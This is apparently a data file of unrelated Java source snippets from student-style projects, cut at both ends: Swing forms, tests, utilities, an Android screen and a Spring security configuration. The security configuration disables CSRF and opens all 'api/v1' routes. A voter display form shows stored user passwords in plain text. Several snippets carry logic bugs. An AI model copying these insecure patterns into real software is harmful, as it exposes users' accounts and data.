FibonacciGenerator {\n    @Override\n    public void generateFibonacci(int n) {\n        System.out.println(\"\\nFibonacci series in words:\");\n        for (int i = 0; i < n; i++) {\n            String word = NumberWords.convertNumberToWords(calculateFibonacci(i));\n            if (i != 0) {\n                System.out.print(\", \");\n            }\n            System.out.print(word);\n        }\n    }\n\n    private int calculateFibonacci(int n) {\n        if (n <= 1)\n            return n;\n        int fib = 1;\n        int prevFib = 1;\n        for (int i = 2; i < n; i++) {\n            int temp = fib;\n            fib += prevFib;\n            prevFib = temp;\n        }\n        return fib;\n    }\n}\n\nclass NumberWords {\n    private static final String[] units = {\"\", \"One\", \"Two\", \"Three\", \"Four\", \"Five\", \"Six\", \"Seven\", \"Eight\", \"Nine\"};\n    private static final String[] teens = {\"\", \"Eleven\", \"Twelve\", \"Thirteen\", \"Fourteen\", \"Fifteen\", \"Sixteen\", \"Seventeen\", \"Eighteen\", \"Nineteen\"};\n    private static final String[] tens = {\"\", \"Ten\", \"Twenty\", \"Thirty\", \"Forty\", \"Fifty\", \"Sixty\", \"Seventy\", \"Eighty\", \"Ninety\"};\n\n    public static String convertNumberToWords(int number) {\n        if (number == 0) {\n            return \"Zero\";\n        }\n        return convertNumber(number).trim();\n    }\n\n    private static String convertNumber(int number) {\n        if (number < 0) {\n            return \"Negative \" + convertNumber(-number);\n        }\n        if (number < 10) {\n            return units[number];\n        }\n        if (number < 20) {\n            return teens[number - 10];\n        }\n        if (number < 100) {\n            return tens[number / 10] + \"-\" + units[number % 10];\n        }\n        return \"Number too large to convert\";\n    }\n}",
    "import org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\n\nimport static org.junit.jupiter.api.Assertions.*;\n\nclass Recitation7Test {\n\n    @Test\n    @DisplayName(\"[1] test lastItemReachable\")\n    void lastItemReachable() {\n        int[] hop1 = {0};\n        assertTrue(Recitation7.lastItemReachable(hop1));\n        hop1[0] = 2;\n        assertTrue(Recitation7.lastItemReachable(hop1));\n\n        int[] hop2 = {0, 2};\n        assertFalse(Recitation7.lastItemReachable(hop2));\n\n        int[] hop3 = {1, 2, 0, 2, 1, 0};\n        assertTrue(Recitation7.lastItemReachable(hop3));\n\n        int[] hop4 = {1, 2, 0, 3, 1, 0};\n        assertTrue(Recitation7.lastItemReachable(hop4));\n    }\n\n    @Test\n    @DisplayName(\"[2] test slidingWindowMinTest\")\n    void slidingWindowMinTest() {\n        int[] lst = {2, 8, -3, 5, 4};\n\n        int[] expected1 = {-3, -3, -3};\n        assertArrayEquals(expected1, Recitation7.slidingWindowMin(lst,3));\n\n        int[] expected2 = {-3, -3};\n        assertArrayEquals(expected2, Recitation7.slidingWindowMin(lst,4));\n\n        int[] expected3 = {-3};\n        assertArrayEquals(expected3, Recitation7.slidingWindowMin(lst,5));\n\n        int[] expected4 = {};\n        assertArrayEquals(expected4, Recitation7.slidingWindowMin(lst,6));\n\n\n    }\n}",
    "import javax.swing.JOptionPane;\n\npublic class Ejercicio {\n\n    public static void main(String[] args) {\n\n        int dec;\n        String binario, hex, oct;\n        boolean verificado;\n\n        do {\n            binario = JOptionPane.showInputDialog(\"Ingrese un n\u00famero binario:\");\n            verificado = true;\n\n            for (int i = 0; i < binario.length(); i++) {\n                if (binario.charAt(i) != '1' && binario.charAt(i) != '0') {\n                    verificado = false;\n                }\n            }\n\n            if (verificado == false) {\n                JOptionPane.showMessageDialog(null, \"N\u00daMERO INV\u00c1LIDO, INGRESE UNO V\u00c1LIDO\");\n            }\n\n        } while (verificado == false);\n\n        dec = (int) Long.parseLong(binario, 2);\n        oct = Integer.toOctalString(dec);\n        hex = Integer.toHexString(dec);\n\n        JOptionPane.showMessageDialog(null, \"El n\u00famero binario \" + binario + \" es:\\n\"\n                + \"en Decimal: \" + dec + \"\\nen Octal: \" + oct + \"\\nen Hexadecimal: \" + hex);\n\n    }\n}",
    "package Hotel.Management.System;\r\n\r\nimport javax.swing.*;\r\nimport java.awt.*;\r\nimport java.awt.event.ActionEvent;\r\nimport java.awt.event.ActionListener;\r\n\r\npublic class Add_driver extends JFrame {\r\n    JTextField t1,t2,t3,t4,t5;\r\n    JRadioButton RB1,RB2;\r\n    JComboBox comboBox,comboBox2;\r\n    JButton b1,b2;\r\n    Add_driver(){\r\n        JPanel panel = new JPanel();\r\n        panel.setBounds(5,5,890,490);\r\n        panel.setBackground(new Color(3,45,48));\r\n        panel.setLayout(null);\r\n        add(panel);\r\n\r\n        JLabel l0 = new JLabel(\"ADD DRIVERS\");\r\n        l0.setForeground(Color.white);\r\n        l0.setFont(new Font(\"Tahoma\", Font.BOLD,23));\r\n        l0.setBounds(194,10,170,22);\r\n        panel.add(l0);\r\n\r\n        JLabel name = new JLabel(\"NAME\");\r\n        name.setBounds(64,70,102,22);\r\n        name.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        name.setForeground(Color.white);\r\n        panel.add(name);\r\n        JTextField t1 = new JTextField();\r\n        t1.setForeground(Color.white);\r\n        t1.setBounds(180,70,156,20);\r\n        t1.setBackground(new Color(16,108,115));\r\n        t1.setFont(new Font(\"Tahoma\",Font.BOLD,18));\r\n        panel.add(t1);\r\n\r\n        JLabel age = new JLabel(\"AGE\");\r\n        age.setBounds(64,110,102,22);\r\n        age.setForeground(Color.white);\r\n        age.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        panel.add(age);\r\n        JTextField t2 = new JTextField();\r\n        t2.setBounds(180,110,156,20);\r\n        t2.setForeground(Color.white);\r\n        t2.setFont(new Font(\"Tahoma\",Font.BOLD,18));\r\n        t2.setBackground(new Color(16,108,115));\r\n        panel.add(t2);\r\n\r\n        JLabel gender = new JLabel(\"GENDER\");\r\n        gender.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        gender.setForeground(Color.white);\r\n        gender.setBounds(64,150,102,22);\r\n        panel.add(gender);\r\n        JRadioButton RB1 = new JRadioButton(\"MALE\");\r\n        RB1.setBounds(170,150,90,22);\r\n        RB1.setBackground(new Color(3,45,48));\r\n        RB1.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        RB1.setForeground(Color.WHITE);\r\n        panel.add(RB1);\r\n        JRadioButton RB2 = new JRadioButton(\"FEMALE\");\r\n        RB2.setBounds(260,150,95,22);\r\n        RB2.setBackground(new Color(3,45,48));\r\n        RB2.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        RB2.setForeground(Color.WHITE);\r\n        panel.add(RB2);\r\n\r\n        JLabel carC = new JLabel(\"CAR COMPANY\");\r\n        carC.setBounds(64,190,115,22);\r\n        carC.setForeground(Color.white);\r\n        carC.setFont(new Font(\"Tahoma\",Font.BOLD,15));\r\n        panel.add(carC);\r\n        JTextField t4 =new JTextField();\r\n        t4.setBounds(180,190,156,20);\r\n        t4.setBackground(new Color(16,108,115));\r\n        t4.setForeground(Color.white);\r\n        t4.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        panel.add(t4);\r\n\r\n        JLabel carN = new JLabel(\"CAR NAME\");\r\n        carN.setBounds(64,240,102,22);\r\n        carN.setForeground(Color.white);\r\n        carN.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        panel.add(carN);\r\n        JComboBox comboBox = new JComboBox(new String [] {\"TAHR\" , \"ENOVA\" , \"SCARPIO\" , \"BLEARO\",\"SOMO\" , \"SWIT\" , \"TATA NANO\" ,\"OTHER\"});\r\n        comboBox.setBounds(180,240,156,20);\r\n        comboBox.setForeground(Color.white);\r\n        comboBox.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        comboBox.setBackground(new Color(15,108,115));\r\n        panel.add(comboBox);\r\n\r\n\r\n\r\n        JLabel avl = new JLabel(\"AVAILABLE\");\r\n        avl.setBounds(64,280,102,22);\r\n        avl.setForeground(Color.white);\r\n        avl.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        panel.add(avl);\r\n        JComboBox comboBox2 = new JComboBox(new String [] {\"YES\" , \"NO\"});\r\n        comboBox2.setBounds(180,280,156,20);\r\n        comboBox2.setForeground(Color.white);\r\n        comboBox2.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        comboBox2.setBackground(new Color(15,108,115));\r\n        panel.add(comboBox2);\r\n\r\n        JLabel Loc = new JLabel(\"Location\");\r\n        Loc.setBounds(64,320,102,22);\r\n        Loc.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        Loc.setForeground(Color.white);\r\n        Loc.setBackground(new Color(16,108,115));\r\n        panel.add(Loc);\r\n        JTextField t5 = new JTextField();\r\n        t5.setBounds(180,320,156,20);\r\n        t5.setForeground(Color.white);\r\n        t5.setFont(new Font(\"Tahoma\",Font.BOLD,18));\r\n        t5.setBackground(new Color(16,108,115));\r\n        panel.add(t5);\r\n\r\n        JButton b1 = new JButton(\"BACK\");\r\n        b1.setBounds(70,380,100,40);\r\n        b1.setBackground(Color.black);\r\n        b1.setForeground(Color.white);\r\n        b1.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        panel.add(b1);\r\n        b1.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                if (e.getSource()==b1){\r\n                    new Admin();\r\n                    setVisible(false);\r\n                }\r\n\r\n            }\r\n   ",
    "import java.awt.Color;\n\nimport Components.Draw;\nimport Components.Entity;\nimport Components.Simulator;\nimport Components.Vector2D;\n\npublic class EnvironmentSim {\n    public static void main(String[] args) {\n        Draw canvas = new Draw();\n        Simulator listener = new Simulator(canvas);\n\n        canvas.setTitle(\"EnvironmentSim\");\n        canvas.enableDoubleBuffering();\n        canvas.addListener(listener);\n        canvas.enableTimer(60);\n\n        for(int i = 0; i < 15; i++) {\n            Entity prey = new Entity();\n\n            prey.position.x = (int) Math.random() * 800;\n            prey.position.y = (int) Math.random() * 800;\n\n            prey.matingScoreIncrease = .9;\n            prey.predatorScore = 0.1;\n            prey.hungerIncrease = 0.5;\n\n            prey.color = new Color(15, 255, 15);\n\n            listener.AddEntity(prey);\n        }\n\n        for(int i = 0; i < 5; i++) {\n            Entity predator = new Entity();\n\n            predator.position.x = (int) Math.random() * 800;\n            predator.position.y = (int) Math.random() * 800;\n\n            predator.predatorScore = 0.9;\n            predator.matingScoreIncrease = 0.1;\n            predator.hungerIncrease = 0.9;\n\n            predator.color = new Color(255, 15, 15);\n\n            listener.AddEntity(predator);\n        }\n\n    }\n}",
    "package com.campusdual.util;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.text.DecimalFormat;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\n\npublic class Utils {\n\n    private Utils(){}\n\n    public static final Random random = new Random();\n    public static final DecimalFormat dF = new DecimalFormat(\"#.##\");\n\n    /**\n     * Method to initialize input data.\n     * @return input Buffered string data.\n     */\n    public static String init() {\n        String buffer = \"\";\n        InputStreamReader stream = new InputStreamReader(System.in);\n        BufferedReader reader = new BufferedReader(stream);\n        try {\n            buffer = reader.readLine();\n        } catch (Exception e) {\n            System.out.append(\"Dato no v\u00e1lido.\");\n        }\n        return buffer;\n    }\n\n    /**\n     * Method to get an integer from input data.\n     * @return integer entered by the user.\n     */\n    public static int integer() {\n        return Utils.integer(null);\n    }\n\n    /**\n     * Method to get an integer from input data with a custom message.\n     * @param message custom message for the user.\n     * @return integer entered by the user.\n     */\n    public static int integer(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n\n        try{\n            return Integer.parseInt(Utils.init());\n        } catch (NumberFormatException e){\n            System.out.println(\"El valor no es un n\u00famero entero.\");\n            return integer(message);\n        }\n    }\n\n\n    /**\n     * Method to get a real number from input data.\n     * @return real number entered by the user.\n     */\n    public static double real() {\n        return Utils.real(null);\n    }\n\n    /**\n     * Method to get a real number from input data with a custom message.\n     * @param message custom message for the user.\n     * @return real number entered by the user.\n     */\n    public static double real(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        try{\n\n            return Double.parseDouble(Utils.init());\n        } catch (NumberFormatException e){\n            System.out.println(\"El valor no es un n\u00famero real.\");\n            return real(message);\n        }\n    }\n\n    /**\n     * Method to get a text string from input data.\n     * @return text string entered by the user.\n     */\n    public static String string() {\n        return Utils.string(null);\n    }\n\n\n    /**\n     * Method to get a text string from input data with a custom message.\n     * @param message custom message for the user.\n     * @return text string entered by the user.\n     */\n    public static String string(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        return Utils.init();\n    }\n\n    /**\n     * Method to get a character from input data.\n     * @return character entered by the user.\n     */\n    public static char character() {\n        return Utils.character(null);\n    }\n\n    /**\n     * Method to get a character from input data with a custom message.\n     * @param message custom message for the user.\n     * @return character entered by the user.\n     */\n    public static char character(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        String valor = Utils.init();\n        return valor.charAt(0);\n    }\n\n    /**\n     * Formats the {@link Double} value passed as a parameter with the pattern #.##\n     *\n     * @param d\n     *            the value to be transformed\n     * @return The formatted double\n     */\n    public static String formatLocalNumber(double d) {\n        return dF.format(d);\n    }\n\n    /**\n     * Retrieves a random number selected from the values passed as parameters.\n     *\n     * @param min\n     *            The lower limit of the range\n     * @param max\n     *            The upper limit of the range\n     * @return A random number within the selected range.\n     */\n    public static int getRandomNumberInRange(int min, int max) {\n        max++;\n        return random.nextInt(max - min) + min;\n    }\n\n    /**\n     * Displays a list with indices and allows it to show a waiting message.\n     *\n     * @param list\n     *            The list to be displayed\n     * @param wait\n     *            <code>true</code> to wait after displaying the list,\n     *            <code>false</code> otherwise.\n     */\n    public static <T> void showFromList(List<T> list, boolean wait) {\n        Utils.showFromList(list, wait, null);\n    }\n\n    /**\n     * Displays a list with indices, allows showing a waiting message, and excludes\n     * the elements from the first list that are present in the second list.\n     *\n     * @param list\n     *            The list to be displayed\n     * @param wait\n     *            <code>true</code> to wait after displaying the list,\n     *            <code>false</code> otherwise.\n     * @param excludeElements\n     *      ",
    "package com.example.food.config;\n\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.authentication.AuthenticationProvider;\nimport org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;\nimport org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;\nimport org.springframework.security.config.http.SessionCreationPolicy;\nimport org.springframework.security.core.context.SecurityContextHolder;\nimport org.springframework.security.web.SecurityFilterChain;\nimport org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;\nimport org.springframework.security.web.authentication.logout.LogoutHandler;\n\nimport static org.springframework.http.HttpMethod.*;\nimport static org.springframework.http.HttpMethod.DELETE;\n\n@Configuration\n@EnableWebSecurity\n@RequiredArgsConstructor\n@EnableMethodSecurity\n@EnableGlobalMethodSecurity(prePostEnabled = true)\npublic class SecurityConfig {\n    private final JwtAuthenticationFilter jwtAuthenticationFilter;\n    private final AuthenticationProvider authenticationProvider;\n    private final LogoutHandler logoutHandler;\n\n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        http\n                .cors(httpSecurityCorsConfigurer -> httpSecurityCorsConfigurer.configure(http))\n                .csrf(AbstractHttpConfigurer::disable)\n                .authorizeHttpRequests(authentication -> authentication\n                        .requestMatchers(\"/api/v1/auth/**\",\n                                \"/v2/api-docs\",\n                                \"/v3/api-docs\",\n//                                \"/v3/api-docs/**\",\n                                \"/swagger-resources\",\n                                \"/swagger-resources/**\",\n                                \"/configuration/ui\",\n                                \"/configuration/security\",\n                                \"/swagger-ui/**\",\n                                \"/webjars/**\",\n                                \"/swagger-ui.html\")\n                        .permitAll()\n                        .requestMatchers(\"api/v1/**\")\n                        .permitAll()\n                        .anyRequest()\n                        .authenticated())\n                .sessionManagement(session -> session\n                        .sessionCreationPolicy(SessionCreationPolicy.STATELESS))\n                .authenticationProvider(authenticationProvider)\n                .addFilterBefore(jwtAuthenticationFilter, UsernamePasswordAuthenticationFilter.class)\n\n                .logout(logoutRequest -> logoutRequest\n                        .logoutUrl(\"/api/v1/auth/logout\")\n                        .addLogoutHandler(logoutHandler)\n                        .logoutSuccessHandler(((request, response, authentication) ->\n                                SecurityContextHolder.clearContext()))\n                )\n        ;\n        return http.build();\n\n    }\n}\n",
    "package edu.iu.c212.utils;\r\n\r\nimport edu.iu.c212.models.*;\r\n\r\nimport java.io.File;\r\nimport java.io.IOException;\r\nimport java.util.List;\r\n\r\npublic class FileUtils {\r\n    private static File inputFile = new File(\"../resources/input.txt\");\r\n    private static File outputFile = new File(\"../resources/output.txt\");\r\n    private static File inventoryFile = new File(\"../resources/inventory.txt\");\r\n    private static File staffFile = new File(\"../resources/staff.txt\");\r\n    private static File staffAvailabilityFile = new File(\"../resources/staff_availability_IN.txt\");\r\n    private static File shiftSchedulesFile = new File(\"../resources/shift_schedules_IN.txt\");\r\n    private static File storeScheduleFile = new File(\"../resources/store_schedule_OUT.txt\");\r\n\r\n    public static List<Item> readInventoryFromFile() throws IOException {\r\n        System.out.println(inventoryFile/*.toURI()*/.getPath() + \"\\n\" + inventoryFile.exists());\r\n        // depending on your OS, toURI() may need to be used when working with paths\r\n        // TODO\r\n        return null;\r\n    }\r\n\r\n    public List<Staff> readStaffFromFile() throws IOException {\r\n        // TODO\r\n        return null;\r\n    }\r\n\r\n    public void writeInventoryToFile(List<Item> items) {\r\n        // TODO\r\n\r\n    }\r\n\r\n    public void writeStaffToFile(List<Staff> employees) {\r\n        // TODO\r\n    }\r\n\r\n    public static List<String> readCommandsFromFile() throws IOException {\r\n        // TODO\r\n        return null;\r\n    }\r\n\r\n    public static void writeStoreScheduleToFile(List<String> lines) {\r\n        // TODO\r\n    }\r\n\r\n    public static void writeLineToOutputFile(String line) {\r\n        // TODO\r\n    }\r\n\r\n}\r\n",
    "package com.muen.letsjump;\n\nimport android.content.Intent;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\n\nimport androidx.annotation.Nullable;\nimport androidx.appcompat.app.AppCompatActivity;\n\npublic class WelcomeActivity extends AppCompatActivity implements View.OnClickListener{\n    private Button btnStart;\n    private Button btnRank;\n    private Button btnQuit;\n\n    @Override\n    protected void onCreate(@Nullable Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_welcome);\n        btnStart=findViewById(R.id.startgame);\n        btnRank=findViewById(R.id.topscore);\n        btnQuit=findViewById(R.id.quitgame);\n        btnStart.setOnClickListener(this);\n        btnRank.setOnClickListener(this);\n        btnQuit.setOnClickListener(this);\n    }\n\n    @Override\n    public void onClick(View v) {\n        switch (v.getId())\n        {\n            case R.id.startgame:\n                Intent intent=new Intent(this,GameActivity.class);\n                startActivity(intent);\n                break;\n            case R.id.topscore:\n                Intent intent1=new Intent(this,TopScoreActivity.class);\n                startActivity(intent1);\n                break;\n            case R.id.quitgame:\n                finish();\n                break;\n        }\n    }\n}\n",
    "import java.util.*;\r\n\r\nclass Movie {\r\n    String rating;\r\n    double ratingValue;\r\n\r\n    public Movie(String rating, double ratingValue) {\r\n        this.rating = rating;\r\n        this.ratingValue = ratingValue;\r\n    }\r\n}\r\n\r\npublic class MovieRatings {\r\n    public static void main(String[] args) {\r\n        List<Movie> movies = new ArrayList<>();\r\n        movies.add(new Movie(\"PG\", 4.5));\r\n        movies.add(new Movie(\"PG\", 3.8));\r\n        movies.add(new Movie(\"PG-13\", 4.0));\r\n        movies.add(new Movie(\"R\", 3.2));\r\n        movies.add(new Movie(\"R\", 4.8));\r\n        movies.add(new Movie(\"PG-13\", 3.9));\r\n\r\n       \r\n        Map<String, Double> totalRating = new HashMap<>();\r\n        Map<String, Integer> count = new HashMap<>();\r\n\r\n        for (Movie movie : movies) {\r\n            if (!totalRating.containsKey(movie.rating)) {\r\n                totalRating.put(movie.rating, 0.0);\r\n                count.put(movie.rating, 0);\r\n            }\r\n\r\n            totalRating.put(movie.rating, totalRating.get(movie.rating) + movie.ratingValue);\r\n            count.put(movie.rating, count.get(movie.rating) + 1);\r\n        }\r\n\r\n        Map<String, Double> avgRating = new HashMap<>();\r\n        for (String category : totalRating.keySet()) {\r\n            avgRating.put(category, totalRating.get(category) / count.get(category));\r\n        }\r\n\r\n        for (String category : avgRating.keySet()) {\r\n            System.out.println(\"Category: \" + category);\r\n            System.out.println(\"Number of movies rated: \" + count.get(category));\r\n            System.out.println(\"Average rating: \" + avgRating.get(category));\r\n            System.out.println();\r\n        }\r\n    }\r\n}\r\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\npackage loginandsignup;\nimport javax.swing.table.DefaultTableModel;\nimport java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\n/**\n *\n * @author Rim\n */\npublic class DisplayVoter extends javax.swing.JFrame {\n\n    /**\n     * Creates new form DisplayVoter\n     */\n    public DisplayVoter() {\n        initComponents();\n           displayUsers();\n    }\n      private void displayUsers() {\n        DefaultTableModel model = (DefaultTableModel) jTable1.getModel();\n        model.setRowCount(0); // Clear existing rows\n\n        try (Connection conn = DatabaseConnection.connect()) {\n            if (conn == null) {\n                System.out.println(\"Database connection failed.\");\n                return;\n            }\n\n            String sql = \"SELECT * FROM users\";\n            try (PreparedStatement preparedStatement = conn.prepareStatement(sql)) {\n                try (ResultSet resultSet = preparedStatement.executeQuery()) {\n                    while (resultSet.next()) {\n                        // Retrieve data from the result set\n                        int id = resultSet.getInt(\"id\");\n                        String fullName = resultSet.getString(\"full_name\");\n                        String email = resultSet.getString(\"email\");\n                        String password = resultSet.getString(\"password\");\n                        String phoneNumber = resultSet.getString(\"phone_number\");\n                        String country = resultSet.getString(\"country\");\n                        String city = resultSet.getString(\"city\");\n                        String age = resultSet.getString(\"age\");\n\n                        // Add data to the table\n                        model.addRow(new Object[]{id, fullName, email, password, phoneNumber, country, city, age});\n                    }\n                }\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jPanel1 = new javax.swing.JPanel();\n        jPanel2 = new javax.swing.JPanel();\n        jLabel1 = new javax.swing.JLabel();\n        jPanel5 = new javax.swing.JPanel();\n        jPanel7 = new javax.swing.JPanel();\n        jButton4 = new javax.swing.JButton();\n        jButton5 = new javax.swing.JButton();\n        jButton6 = new javax.swing.JButton();\n        jLabel4 = new javax.swing.JLabel();\n        jLabel6 = new javax.swing.JLabel();\n        jButton7 = new javax.swing.JButton();\n        jButton8 = new javax.swing.JButton();\n        jButton9 = new javax.swing.JButton();\n        jPanel9 = new javax.swing.JPanel();\n        jPanel11 = new javax.swing.JPanel();\n        jButton1 = new javax.swing.JButton();\n        jPanel8 = new javax.swing.JPanel();\n        jPanel6 = new javax.swing.JPanel();\n        jLabel2 = new javax.swing.JLabel();\n        jButton15 = new javax.swing.JButton();\n        jPanel3 = new javax.swing.JPanel();\n        jButton3 = new javax.swing.JButton();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        jTable1 = new javax.swing.JTable();\n        jLabel5 = new javax.swing.JLabel();\n        jPanel13 = new javax.swing.JPanel();\n        jPanel14 = new javax.swing.JPanel();\n        jPanel4 = new javax.swing.JPanel();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        jPanel1.setBackground(new java.awt.Color(255, 255, 255));\n        jPanel1.setPreferredSize(new java.awt.Dimension(800, 500));\n        jPanel1.setLayout(null);\n\n        jPanel2.setBackground(new java.awt.Color(162, 220, 239));\n\n        jPanel5.setBackground(new java.awt.Color(218, 241, 245));\n\n        javax.swing.GroupLayout jPanel5Layout = new javax.swing.GroupLayout(jPanel5);\n        jPanel5.setLayout(jPanel5Layout);\n        jPanel5Layout.setHorizontalGroup(\n            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 196, Short.MAX_VALUE)\n        );\n        jPanel5Layout.setVerticalGroup(\n            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 382, Short.MAX_VALUE)\n        );\n\n        jPanel7.setBackground(new java.awt.Color(162, 220, 239));\n\n        jButton4.setBackground(new java.awt.Color(162, 220, 239));\n        jButton4.setFont(new java.awt.Font(\"Segoe UI Black\", 3, 12)); // NOI18N\n        jButton4.setForeground(new java.awt.Color(255, 255, 255));\n        jButton4.setText(\"A",
    "package com.greedystar.generator.utils;\n\nimport freemarker.template.Configuration;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.util.Locale;\n\n/**\n * @author GreedyStar\n * @since 2018/4/19\n */\npublic class FreemarkerConfigUtil {\n    /**\n     * \u6a21\u677f\u8def\u5f84\n     */\n    private static String path = new File(FreemarkerConfigUtil.class.getClassLoader().getResource(\"ftls\").getFile()).getPath();\n    /**\n     * freemarker\u914d\u7f6e\n     */\n    private static volatile Configuration configuration;\n    public final static int TYPE_ENTITY = 0;\n    public final static int TYPE_DAO = 1;\n    public final static int TYPE_SERVICE = 2;\n    public final static int TYPE_CONTROLLER = 3;\n    public final static int TYPE_MAPPER = 4;\n    public final static int TYPE_INTERFACE = 5;\n\n    public static Configuration getInstance() {\n        if (null == configuration) {\n            synchronized (FreemarkerConfigUtil.class) {\n                if (null == configuration) {\n                    configuration = new Configuration(Configuration.VERSION_2_3_23);\n                    try {\n                        if (path.contains(\"jar\")) {\n                            configuration.setClassForTemplateLoading(FreemarkerConfigUtil.class, \"/ftls\");\n                        } else {\n                            configuration.setDirectoryForTemplateLoading(new File(path));\n                        }\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                    configuration.setEncoding(Locale.CHINA, \"utf-8\");\n                }\n            }\n        }\n        return configuration;\n    }\n}\n",
    "package com.deveficiente.basecamp.contas;\n\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.UUID;\n\nimport jakarta.persistence.Column;\nimport jakarta.persistence.Entity;\nimport jakarta.persistence.GeneratedValue;\nimport jakarta.persistence.GenerationType;\nimport jakarta.persistence.Id;\nimport jakarta.validation.constraints.NotBlank;\nimport jakarta.validation.constraints.NotNull;\nimport org.springframework.util.Assert;\n\n@Entity\npublic class Conta {\n\n\t@Id\n\t@GeneratedValue(strategy = GenerationType.IDENTITY)\n\tprivate Long id;\n\tprivate @NotBlank String nome;\n\t@NotNull\n\t@Column(unique = true)\n\tprivate UUID idOwnerPrimaria;\n\t@NotNull\n\tprivate UUID idGlobal = UUID.randomUUID();\n\t\n\t@Deprecated\n\tpublic Conta() {\n\t\t\n\t}\n\n\tpublic Conta(@NotBlank String nome, UUID idOwnerPrimaria) {\n\t\tthis.nome = nome;\n\t\tthis.idOwnerPrimaria = idOwnerPrimaria;\n\t}\n\n\t\n\tpublic UUID getIdGlobal() {\n\t\treturn idGlobal;\n\t}\n\n\tpublic boolean pertenceAoUsuario(UUID idOwnerPrimaria) {\n\t\treturn this.idOwnerPrimaria.equals(idOwnerPrimaria);\n\t}\n\n    public Set<ConviteConta> geraConvites(NovoConviteContaRequest request) {\n\n\t\t/*\n\t\t* #copilotGerou\n\t\t* Olha de novo o c\u00f3digo gerado pelo copilot...  Basicamente um script....\n\t\t */\n//\t\tfor (String email : request.getEmailsConvidados()) {\n//\t\t\tConviteConta convite = new ConviteConta(email, request.getDataExpiracao());\n//\t\t\tconvitesGerados.add(convite);\n//\t\t}\n\n\t\t//se eu quiser \u00e9 s\u00f3 extrair uma interface expondo o m\u00e9todo toConvites\n\t\tList<ConviteConta> convitesGerados = request.toConvites(this);\n\t\tHashSet<ConviteConta> convitesUnicos = new HashSet<>(convitesGerados);\n\n\t\t//aqui eu pensei em n\u00e3o deixar duplicar convite... mas pensei melhor e n\u00e3o vi problema.\n\n\t\t//exemplo de p\u00f3s condicao\n\t\tAssert.isTrue(convitesUnicos.size() == convitesGerados.size(),\"O n\u00famero de convites unicos est\u00e1 diferente do numero de convites solicitados originalmente. Deve ter email duplicado na lista original\");\n\n\t\treturn convitesUnicos;\n    }\n}\n",
    "\r\n\r\nimport java.io.IOException;\r\nimport java.io.PrintWriter;\r\n\r\nimport javax.servlet.ServletException;\r\nimport javax.servlet.annotation.WebServlet;\r\nimport javax.servlet.http.HttpServlet;\r\nimport javax.servlet.http.HttpServletRequest;\r\nimport javax.servlet.http.HttpServletResponse;\r\n\r\n/**\r\n * Servlet implementation class SearchEngine\r\n */\r\n@WebServlet(\"/SearchEngine\")\r\npublic class SearchEngine extends HttpServlet {\r\n\tprivate static final long serialVersionUID = 1L;\r\n       \r\n    /**\r\n     * @see HttpServlet#HttpServlet()\r\n     */\r\n    public SearchEngine() {\r\n        super();\r\n        // TODO Auto-generated constructor stub\r\n    }\r\n\r\n\t/**\r\n\t * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)\r\n\t */\r\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n\t\tresponse.setContentType(\"text/html\");\r\n\t\tPrintWriter pw=response.getWriter();\r\n\t\tString 